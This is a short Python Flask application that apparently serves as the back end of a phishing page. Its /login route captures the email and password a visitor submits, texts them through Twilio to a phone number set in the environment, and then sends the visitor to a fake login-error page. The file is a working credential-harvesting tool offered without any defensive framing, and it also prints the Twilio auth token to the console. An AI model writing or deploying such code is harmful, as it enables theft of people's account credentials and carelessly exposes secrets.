from flask import Flask, render_template, request, redirect
from twilio.rest import Client
import os
from dotenv import load_dotenv
load_dotenv()

print(os.getenv('AUTH_TOKEN'))

app = Flask(__name__)

@app.route('/',methods=['POST', 'GET'])
def index():
    # return "Hello World"
    return render_template('index.html')

@app.route('/login_error',methods=['POST', 'GET'])
def login_error():
    return render_template('submit.html')

@app.route('/login', methods=['POST', 'GET'])
def login():
    if request.method=='POST':
        l_email = request.form['username']
        l_pass = request.form['password']
        if not l_email or not l_pass:
            return redirect('/')
        else:
            sender_name = "New User"
            sender_email = l_email
            sender_password = l_pass

            account_sid = os.getenv('ACCOUNT_SSID')
            auth_token = os.getenv('AUTH_TOKEN')
            client = Client(account_sid, auth_token) 
            message = client.messages.create( 
                                        from_=os.getenv('TWILIO_NUMBER'),  
                                        body=f'{sender_name}\n{sender_email}\n{sender_password}',      
                                        to=os.getenv('RECEIVER_NUMBER')) 
            print("Success")
            return redirect('/login_error')
    else:
        return redirect('/')


if __name__ == '__main__':
    app.run(debug=False, port=os.getenv("PORT", default=5000))
